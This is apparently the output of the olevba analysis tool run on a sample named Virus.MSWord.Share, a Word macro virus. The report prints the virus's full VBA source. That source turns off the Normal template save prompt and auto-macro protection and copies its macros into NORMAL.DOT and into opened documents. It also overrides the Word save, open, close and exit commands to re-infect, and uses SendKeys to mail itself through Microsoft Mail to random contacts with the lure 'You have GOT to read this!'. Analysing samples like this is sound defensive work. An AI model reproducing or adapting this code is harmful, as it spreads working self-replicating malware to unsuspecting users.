olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Share
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Changes the active template and the template options"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
WordBasic.Call "autoOpen.saveall"
WordBasic.Beep
End Sub
-------------------------------------------------------------------------------
VBA MACRO ShareTheFun.bas 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/ShareTheFun'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error GoTo -1: On Error GoTo errsending
    WordBasic.FileSaveAs Name:="c:\doc1.doc", Format:=1
    If WordBasic.AppIsRunning("Microsoft Mail") Then
        WordBasic.AppActivate "Microsoft Mail"
    Else
        WordBasic.ExitWindows
    End If
    WordBasic.SendKeys "{enter}"
    WordBasic.SendKeys "%MN"
    
    PickName
    PickName
    PickName

    WordBasic.SendKeys "{TAB}{TAB}You have GOT to read this!{TAB}"
    WordBasic.SendKeys "%Ac:\doc1.doc{ENTER}%o"
    WordBasic.SendKeys "%S", -1
    WordBasic.SendKeys "%Vn", -1
    WordBasic.SendKeys "%Vn", -1
    WordBasic.AppClose "Microsoft Mail"
    
errsending:
    On Error GoTo -1: On Error GoTo 0
End Sub

Private Sub PickName()
Dim n$
Dim dn
Dim d
On Error GoTo -1: On Error GoTo woops
    n$ = "," + Chr(WordBasic.Int(Rnd() * 25) + 65)
    WordBasic.SendKeys n$ + "%K", -1
    dn = WordBasic.Int(Rnd() * 6)
    For d = 1 To dn
        WordBasic.SendKeys "{down}"
    Next d
    WordBasic.SendKeys "{ENTER}", -1
woops:
    On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
WordBasic.Call "autoOpen.saveall"
WordBasic.Beep
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
    On Error Resume Next
    WordBasic.Call "autoOpen.SaveAll"
    WordBasic.FileClose
    On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
    On Error Resume Next
    WordBasic.Call "autoOpen.SaveAll"
    WordBasic.FileSave
    On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
    WordBasic.Call "autoOpen.SaveAll"
    On Error GoTo -1: On Error GoTo cancelled
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
    WordBasic.CurValues.FileOpen dlg
    WordBasic.Dialog.FileOpen dlg
    WordBasic.FileOpen dlg
cancelled:
On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileExit.bas 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/FileExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Quits Microsoft Word and prompts to save the documents"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
Dim Save
    On Error Resume Next
    WordBasic.Call "autoOpen.SaveAll"
    WordBasic.FileExit Save
    On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
    On Error GoTo -1: On Error GoTo ErrCt
    
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    WordBasic.DisableAutoMacros 0

    SaveAll
    WordBasic.StartOfDocument
    If WordBasic.Int(Rnd() * 4) + 1 = 3 Then WordBasic.Call "ShareTheFun"

ErrCt:
bye:
    On Error GoTo -1: On Error GoTo 0

End Sub

Private Sub SaveAll()
Dim MacroFile$
    On Error GoTo -1: On Error GoTo errsaving
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    WordBasic.DisableAutoMacros 0

    SaveMacros "autoOpen"
    SaveMacros "FileClose"
    SaveMacros "AutoExec"
    SaveMacros "FileExit"
    SaveMacros "FileSave"
    SaveMacros "FileOpen"
    SaveMacros "FileTemplates"
    SaveMacros "ToolsMacro"
    SaveMacros "ShareTheFun"

    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo dlg

    MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MacroFile$ = "NORMAL.DOT" Then WordBasic.FileSaveAs Format:=1

    WordBasic.StartOfDocument
errsaving:
    On Error GoTo -1: On Error GoTo 0
End Sub

Private Sub SaveMacros(M$)
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
    On Error GoTo -1: On Error GoTo cantsave
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo dlg

    fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":" + M$
    globMacro$ = "Global:" + M$
    MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MacroFile$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy globMacro$, fileMacro$, 1
    Else
        WordBasic.MacroCopy fileMacro$, globMacro$, 1
    End If
    WordBasic.StartOfDocument
cantsave:
On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Share - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem d i n g o a c k
    Rem DisableAutoMacros
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

